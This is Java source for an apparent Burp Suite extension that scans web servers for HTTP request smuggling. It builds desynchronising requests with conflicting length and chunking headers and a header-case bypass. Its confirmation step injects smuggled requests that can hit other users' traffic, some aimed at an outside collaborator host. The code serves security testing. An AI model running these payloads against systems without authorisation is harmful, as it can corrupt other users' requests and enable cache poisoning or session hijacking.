package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.LinkedList;
import java.util.List;
import java.util.zip.GZIPOutputStream;


class SmuggleHelper {

    private RequestEngine engine;
    private List<Resp> reqs = new LinkedList<>();
    private IHttpService service;
    private int id = 0;

    SmuggleHelper(IHttpService service) {
        this.service = service;
        String url = service.getProtocol()+"://"+service.getHost()+":"+service.getPort();
        this.engine = new ThreadedRequestEngine(url, 1, 10, 1, 10, 1, this::callback, 10);
    }

    void queue(String req) {
        engine.queue(req); // , Integer.toString(id++)
    }

    private boolean callback(Request req, boolean interesting) {
        reqs.add(new Resp(new Req(req.getRequestAsBytes(), req.getResponseAsBytes(), service)));
        return false;
    }

    List<Resp> waitFor() {
        engine.start(10);
        engine.showStats(60);
        return reqs;
    }

    // todo move into turbo intruder?
}

public class SmuggleScan extends Scan implements IScannerCheck  {

    static private Resp buildPoc(byte[] req, IHttpService service) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());

            // first request ends here
            buf.write(makeChunked(req, 0, 0));
            return new Resp(new Req(buf.toByteArray(), null, service));
        }
        catch (IOException e) {
            throw new RuntimeException();
        }
    }

    static byte[] gzipBody(byte[] baseReq) {
        try {
            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
            String body = Utilities.getBody(req);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(out);
            gzip.write(Utilities.helpers.stringToBytes(body));
            gzip.close();
            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
        } catch (Exception e) {
            Utilities.err(e.getMessage());
            return baseReq;
        }
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        if (!Utilities.containsBytes("Transfer-Encoding".getBytes(), baseReq)) {
            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
        }

        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);
        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
        return chunkedReq;
    }

    boolean sendPoc(byte[] base, IHttpService service) {
        boolean gpoc = false;
        boolean cpoc2 = false;
        boolean cpoc3 = false;

        if (Utilities.globalSettings.getBoolean("poc: G")) {
            gpoc = sendPoc(base, service, "G", "G");
        }
        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
        //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
        if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
            cpoc2 = sendPoc(base, service, "headerConcat", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
        }
        if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
            cpoc3 = sendPoc(base, service, "bodyConcat", "POST /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8\r\n\r\nfoo=");
        }
        if (Utilities.globalSettings.getBoolean("poc: collab")) {
            sendPoc(base, service, "collab", "GET / HTTP/1.1\r\nHost: "+service.getHost()+".pvocvroibeunt5kkbqvlhuj3wu2rqg.burpcollaborator.net\r\n\r\n");
        }

        return gpoc || cpoc2 || cpoc3;
    }

    boolean sendPoc(byte[] base, IHttpService service, String name, String inject) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(base, "Connection", "keep-alive");
            badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, inject.length(), 0));
            SmuggleHelper helper = new SmuggleHelper(service);
            byte[] victim = makeChunked(base, 0, 0);

            Resp baseline = request(service, victim);
            helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked) + inject);
            helper.queue(Utilities.helpers.bytesToString(victim));
            helper.queue(Utilities.helpers.bytesToString(victim));

            List<Resp> results = helper.waitFor();
            Resp cleanup = null;
            for (int i=0;i<3;i++) {
                cleanup = request(service, victim);
                if (cleanup.getInfo().getStatusCode() != baseline.getInfo().getStatusCode()) {
                    request(service, victim);
                    break;
                }
            }
            short cleanupStatus = cleanup.getStatus();
            short minerStatus = results.get(0).getStatus();
            short victimStatus = results.get(1).getStatus();

            if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
                return false;
            }

            if (cleanupStatus == minerStatus) {
                if (victimStatus == 0) {
                    report("Null victim: "+name, "code1:code1:code2", cleanup, results.get(0), results.get(1));
                }
                else {
                    report("Req smuggling attack (legit): "+name, "code1:code1:code2", cleanup, results.get(0), results.get(1));
                }
            } else if (minerStatus == victimStatus) {
                report("Req smuggling attack (XCON): "+name, "code1:code2:code2", cleanup, results.get(0), results.get(1));
            } else if (cleanupStatus == victimStatus) {
                report("Probably nothing: "+name, "code1:code2:code1", cleanup, results.get(0), results.get(1));
            } else {
                report("Req smuggling attack (hazardous): "+name, "code1:code2:code3", cleanup, results.get(0), results.get(1));
            }

            BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
            return true;
        }
        catch (Exception e) {
            return false;
        }
    }

    byte[] bypassContentLengthFix(byte[] req) {
        return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
    }

    public List<IScanIssue> doScan(byte[] original, IHttpService service) {
        if (Utilities.globalSettings.getBoolean("avoid rescanning vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(service.getHost())) {
            return null;
        }

        if (original[0] == 'G') {
            original = Utilities.helpers.toggleRequestMethod(original);
        }

        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
        original = Utilities.setHeader(original, "Connection", "close");

        byte[] baseReq = makeChunked(original, 0, 0);
        Resp syncedResp = request(service, baseReq);
        if (syncedResp.timedOut()) {
            Utilities.log("Timeout on first request. Aborting.");
            return null;
        }

        Resp suggestedProbe = buildPoc(original, service);

        if (Utilities.globalSettings.getBoolean("try chunk-truncate")) {
            byte[] reverseLength = makeChunked(original, -1, 0); //Utilities.setHeader(baseReq, "Content-Length", "4");
            Resp truncatedChunk = request(service, reverseLength);
            if (truncatedChunk.timedOut()) {

                if (request(service, baseReq).timedOut()) {
                    return null;
                }

                Utilities.log("Reporting reverse timeout technique worked");
                String title = "Req smuggling: chunk truncate";
                if (!sendPoc(original, service)) {
                    title += " unconfirmed";
                }
                report(title, "status:timeout", syncedResp, truncatedChunk, suggestedProbe);
                return null;
            } else {
                byte[] dualChunkTruncate = Utilities.addOrReplaceHeader(reverseLength, "Transfer-encoding", "cow");
                Resp truncatedDualChunk = request(service, dualChunkTruncate);
                if (truncatedDualChunk.timedOut()) {

                    if (request(service, baseReq).timedOut()) {
                        return null;
                    }

                    Utilities.log("Reverse timeout technique with dual TE header worked");
                    String title = "Req smuggling: dual chunk truncate";
                    if (!sendPoc(Utilities.addOrReplaceHeader(original, "Transfer-encoding", "cow"), service)) {
                        title += " unconfirmed";
                    }
                    report(title, "status:timeout", syncedResp, truncatedDualChunk, suggestedProbe);
                    return null;
                }
            }
        }

        if (Utilities.globalSettings.getBoolean("try timeout-diff")) {

            // if we get to here, either they're secure or the frontend uses chunked
            byte[] overlongLength = makeChunked(original, 1, 0); //Utilities.setHeader(baseReq, "Content-Length", "6");
            Resp overlongLengthResp = request(service, overlongLength);
            short overlongLengthCode = 0;
            if (!overlongLengthResp.timedOut()) {
                overlongLengthCode = overlongLengthResp.getInfo().getStatusCode();
            }
            if (overlongLengthCode == syncedResp.getInfo().getStatusCode()) {
                Utilities.log("Overlong content length didn't cause a timeout or code-change. Aborting.");
                return null;
            }

            byte[] invalidChunk = Utilities.setBody(baseReq, "Z\r\n\r\n");
            invalidChunk = Utilities.setHeader(invalidChunk, "Content-Length", "5");
            Resp badChunkResp = request(service, invalidChunk);
            if (badChunkResp.timedOut()) {
                Utilities.log("Bad chunk attack timed out. Aborting.");
                return null;
            }

            if (badChunkResp.getStatus() == syncedResp.getStatus()) {
                Utilities.log("Invalid chunk probe didn't do anything. Attempting overlong chunk timeout instead.");

                byte[] overlongChunk = makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
                Resp overlongChunkResp = request(service, overlongChunk);

                short overlongChunkCode = overlongChunkResp.getStatus();

                if (overlongChunkCode == syncedResp.getStatus() || overlongChunkCode == overlongLengthCode) {
                    Utilities.log("Invalid chunk and overlong chunk both had no effect. Aborting.");
                    return null;
                }

                badChunkResp = overlongChunkResp;
            }

            String title = "Req smuggling: overlong diff";
            if (!sendPoc(original, service)) {
                title += " unconfirmed";
            }
            report(title, "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, overlongLengthResp, suggestedProbe);
        }

        return null;
    }
}

